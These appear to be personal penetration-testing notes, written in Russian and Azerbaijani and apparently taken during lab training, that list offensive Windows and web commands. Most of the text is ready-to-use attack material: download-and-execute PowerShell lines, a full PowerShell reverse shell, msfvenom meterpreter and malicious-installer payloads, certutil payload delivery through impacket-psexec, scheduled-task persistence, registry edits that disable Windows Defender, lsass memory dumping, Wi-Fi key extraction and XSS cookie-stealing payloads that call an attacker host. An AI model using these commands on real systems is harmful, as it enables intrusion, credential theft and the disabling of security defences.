taskkill /f /im explorer.exe - для пользователя это смертельно, т.е он с компом ничего не может сделать, ничего не работает
tasklist - показывает весь список рабочих программ
netstat /? (-q, -r, -s) - firewal-u burdan tapa bilirik
ipconfig /release
ipconfig /flushdns
ipconfig /renew - yeni ip verir
netsh int ip reset
netsh winsock reset
netsh wlan show profile - bizim kompun qoshuldugu butun wifi shebekeleri gosterir
netsh wlan show profile "IT academy" key=clear - bu wifi-in melumatlarini goruruk
ping 192.168.0.1-254 butun iplere ping gonderir ve gire hansi cavab verirse demek ki serverdi o
find / -perm -u=s -type f 2>/dev/null - показать все файлы у которых специальный доступ
ipconfig /release
ipconfig /flushdns
ipconfig /renew
netsh int ip reset
netsh winsock reset

gpt.censys.io ??


İRM (İnvoke Rest Method) <- Get REquest File
IEX (Invoke Expression) <- Execute
EP (Execution Policy) <- bypass

powershell -EP bypass IRM my-ip/ps1 | IEX

`powershell.exe -ep Bypass, powershell.exe -ex by` - обход политики безопасности

`powershell.exe -enco, powershell -ec` - закодированная команда

`powershell.exe -W h, powershell.exe -Wi hi` - скрывает интерфейс Powershell

`Get-WmiObject -class win32_operatingsystem | fl *` - службы которые обслуживаются win32

`Get-Module -ListAvailable` - список всех доступных модулей

`Import-Module имя_модуля (.\module-name.psm1)` - импортирует нужный нам модуль

 `$ports=(ports_number);$ip="IP"; foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch{}; if ($socket -eq $null) {echo $ip":"$port" -Closed";}else{echo $ip":"$port" -Open"; $socket = $null;}}` - однострочный код, который позволяет узнать нам открыты ли заданные порты в указанном адресе

`Get-Process -Name "firefox" | Kill` - убивает процесс

```
$webclient = New-Object System.Net.WebClient - 1 мы создаем переменную с именем $webclient, которая создает экземпляр класса System.Net.Webclient.Net, который используется для создания веб-клиента
$payload_url = "https://attacker_host/payload.exe" - 2. Затем мы создаем еще одну переменную $payload_url, которая является URL-адресом нашего клиента (т.е. атакующего).
$file = "C:\ProgramData\payload.exe" - Затем переменная $file используется как место, в котором мы хотим сохранить полезную нагрузку на целевой системе (т.е. на компе жертвы).
$webclient.DownloadFile($payload_url,$file) - и наконец, мы вызываем переменную $webclient с методом DownloadFile, который загружает наш payload.exe в целевой каталог
```


https://www.revshells.com/
https://www.base64encode.org/

	scp какой-файл-копируем куда-копируем
`scp important.txt tryhackme@10.10.224.126:/home/ubuntu/tranferred.txt`

	HAVOC
meterpreter-də privisc eləmək lazımdı
meterpreter shell-i ələ keçirtikdən sonra uac bypass neçə eləmək olar



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe` - сначала создаём метерпретер
`msfconsole -q -x "set payload windows/meterpreter/reverse_tcp;use exploit/multi/handler;set LHOST 192.168.0.117;set LPORT 4444;set ExitOnSession false;exploit -j"` - ждём когда созданный метерпретер выполниться в компе жертвы

nmap basic
how its works
diff flags
speed

-scripts
--script.vulners.nse

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream=$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`  ----- его можно скопировать в оболочку cmd.exe (или другой метод выполнения команд на сервере Windows, например, веб-оболочку) и выполнить, что приведет к обратной оболочке

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` - сохраняет историю



Эта функция также дает возможность сохранять эти учетные данные в системе. Команда ниже выведет список сохраненных учетных данных:
`cmdkey /list`
`runas /savecred /user:admin cmd.exe`


`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
быстрый способ найти строки подключения к базе данных в файле


`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`


`C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
`C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi` - Чтобы иметь возможность эксплуатировать эту уязвимость, должны быть установлены оба. В противном случае эксплуатация будет невозможна. Если они установлены, вы можете сгенерировать вредоносный файл .msi с помощью  msfvenom, как показано ниже:

Поскольку это обратная оболочка, вам также следует запустить модуль Metasploit Handler, настроенный соответствующим образом. После того, как вы перенесли созданный вами файл, вы можете запустить установщик с помощью команды ниже и получить обратную оболочку:
`C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`


gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt



`schtasks /create /tn "SecurityStartup" /tr "C:\pathtoprogram.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f` - когда комп запускаеться, то наша программа автоматом запускаеться

`impacket-psexec Username:Password@IP "cmd /c certutil -urlcache -split -f http://OUR_IP:PORT/mamaqurban.exe C:\Windows\Temp\hind.exe & C:\Windows\Temp\hind.exe"` - мы закидываем метер заранее подготовленную в папку и запускаем его.

`impacket-atexec Username:Password@IP "shutdown /r /f /t 00"` - сразу перезагружаем комп чтобы нужный файл заработал



`impacket-psexec 'Administrator:P@$$w0rd!'@192.168.0.120 "cmd /c certutil -urlcache -split -f http://192.168.0.117:8899/mamaqurban.exe C:\Windows\Temp\hind.exe & C:\Windows\Temp\hind.exe"`

`impacket-atexec 'Administrator:P@$$w0rd!'@192.168.0.120 "schtasks /Create /SC ONSTART /TN 'MyTask' /TR 'C:\Shares\Shared\hind.exe' /RL HIGHEST /F"`

`impacket-atexec 'Administrator:P@$$w0rd!'@192.168.0.120 "shutdown /r /f /t 00"`

1 - с помощью респондера надо найти пользователя и хеш
2 - с помощью hashcat -m 5600 hash.txt -a 0 rockyou.txt - находим пароль в хеш.тхт находиться тот самый хеш который мы нашли
3 - создаём метерпретер
4 - python3 -m http.server 80 передаём файл psExec/SMBExec



Test-NetConnection -ComputerName 10.10.10.100 -Port 88 - перед нами есть ли комп у которово открыт керберос

ligolo-ng - типо впн-а


JavaScript
```
<script>alert('THM');</script>
"><script>alert('THM');</script>
</textarea><script>alert('THM');</script>
';alert('THM');//
onload="alert('THM');  во время загрузки фото
```

nc -nlvp PORT_NUMBER - терминал нападающего
```
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> - на сайте жертвы
```

`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`

`reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f`

**скрипт**
```
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction Stop

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -ErrorAction Stop

    Write-Output "Registry keys updated successfully."
} catch {
    Write-Error "Failed to update registry keys: $_"
}
```

`Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled, RealTimeProtectionEnabled, IsTamperProtected`

tasklist | findstr lsass
`procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp`
`procdump.exe -accepteula -ma <PID> C:\Users\Public\lsass.dmp`

